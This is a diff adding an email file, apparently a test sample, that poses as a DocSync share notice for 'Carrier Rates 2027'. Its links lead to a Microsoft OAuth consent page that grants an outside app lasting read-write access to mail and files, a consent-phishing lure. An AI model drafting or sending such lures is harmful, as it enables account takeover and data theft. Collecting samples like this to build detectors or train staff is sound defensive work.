@@ -1,0 +1,33 @@
+From: DocSync <share@docsync-app.test>
+To: Mia <mia.santos@harborline.example>
+Subject: Grace Chen shared 'Carrier Rates 2027' with you
+Date: Mon, 28 Sep 2026 14:36:24 -0000
+Message-ID: <179305156189.797.5836642025735447653@docsync-app.test>
+Authentication-Results: mx.harborline.example; spf=pass
+ smtp.mailfrom=docsync-app.test; dkim=pass header.d=docsync-app.test;
+ dmarc=pass header.from=docsync-app.test
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============8827017481993752564=="
+
+--===============8827017481993752564==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Open the shared file: https://login.microsoftonline.com/common/oauth2/v2.0/au=
+thorize?client_id=3D9f1c&response_type=3Dcode&scope=3DMail.ReadWrite%20Files.=
+ReadWrite.All%20offline_access&redirect_uri=3Dhttps://docsync-app.test/callba=
+ck
+
+--===============8827017481993752564==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Arial,sans-serif"><p>Grace Chen shared a fil=
+e with you.</p><p><a href=3D"https://login.microsoftonline.com/common/oauth2/=
+v2.0/authorize?client_id=3D9f1c&response_type=3Dcode&scope=3DMail.ReadWrite%2=
+0Files.ReadWrite.All%20offline_access&redirect_uri=3Dhttps://docsync-app.test=
+/callback">Open Carrier Rates 2027</a></p></body></html>
+
+--===============8827017481993752564==--
